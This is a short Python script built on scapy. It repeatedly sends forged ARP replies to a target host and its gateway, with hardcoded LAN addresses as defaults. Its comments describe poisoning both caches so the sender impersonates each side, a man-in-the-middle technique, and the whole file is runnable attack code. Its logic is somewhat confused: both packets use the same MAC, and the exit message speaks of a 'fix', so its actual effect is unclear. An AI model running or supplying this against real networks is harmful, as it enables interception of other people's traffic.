from scapy.all import *
import time

def arp_spoof(target_ip, broadcast_mac, gateway_ip, correct_mac):
    # Spoof target ARP entry
    target_arp = ARP(op=2, pdst=target_ip, hwdst=broadcast_mac, psrc=gateway_ip, hwsrc=correct_mac)
    
    # Spoof gateway ARP entry....the gateway should now be the target, and you pretend to be the target
    gateway_arp = ARP(op=2, pdst=gateway_ip, hwdst=broadcast_mac, psrc=target_ip, hwsrc=correct_mac)

    send(target_arp, verbose=0)
    send(gateway_arp, verbose=0)

if __name__ == "__main__":
    # Get target IP address from user input or use hardcoded value
    target_ip_input = input("Enter the target IP address (default is 192.168.0.119): ")
    target_ip = target_ip_input if target_ip_input else "192.168.0.119"

    # Get MAC address from user input or use hardcoded value
    correct_mac_input = input("Enter the correct MAC address (default is ac:84:c6:b0:74:0c): ")
    correct_mac = correct_mac_input if correct_mac_input else "ac:84:c6:b0:74:0c"

    broadcast_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast MAC address
    gateway_ip = "192.168.0.1"

    try:
        # Perform ARP spoofing continuously until KeyboardInterrupt
        while True:
            arp_spoof(target_ip, broadcast_mac, gateway_ip, correct_mac)
            time.sleep(1)  
    except KeyboardInterrupt:
        print("\nFix ARP spoofing stopped by user.")
